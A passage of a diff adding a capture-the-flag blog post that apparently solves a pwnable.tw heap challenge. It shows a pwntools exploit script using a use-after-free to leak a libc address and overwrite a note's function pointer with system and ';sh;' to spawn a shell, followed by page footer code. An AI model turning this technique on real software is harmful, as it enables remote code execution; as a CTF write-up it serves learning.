+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># r = gdb.debug ([exe.path], &#34;b *0x080489ef&#34;)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;chall.pwnable.tw&#34;</span>, <span style="color:#ae81ff">10102</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_note</span> (p, size, content):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Note size :&#39;</span>, size)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Content :&#39;</span>, content)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">free</span> (p, index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index :&#39;</span>, index)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">print_note</span> (p, index):
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Your choice :&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendafter (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Index :&#39;</span>, index)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>    print_chunk_content <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804862b</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    add_note (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;100&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;nguyendd&#39;</span>)
+</span></span><span style="display:flex;"><span>    add_note (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;30&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ndd&#39;</span>)
+</span></span><span style="display:flex;"><span>    free (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>    add_note (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;100&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    print_note (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>    main_arena <span style="color:#f92672">=</span> u32 (p<span style="color:#f92672">.</span>recv (<span style="color:#ae81ff">4</span>))
+</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> main_arena <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1B07B0</span>
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;The address of main_arena is : &#34;</span>, hex (main_arena))
+</span></span><span style="display:flex;"><span>    print (<span style="color:#e6db74">&#34;The address of libc base is : &#34;</span>, hex (libc_base))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    free (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    free (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    add_note (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;8&#39;</span>, p32 (libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;;sh;&#39;</span>)
+</span></span><span style="display:flex;"><span>    print_note (p, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/pwnable.tw/">Pwnable.tw</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="//localhost:1313/blogs/silver_bullet/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Silver bullet (200 pts) - pwnable.tw</span>
+  </a>
+  <a class="next" href="//localhost:1313/blogs/tcache_tear/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Tcache tear (200 pts) - pwnable.tw</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="//localhost:1313/">NguyenDD&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
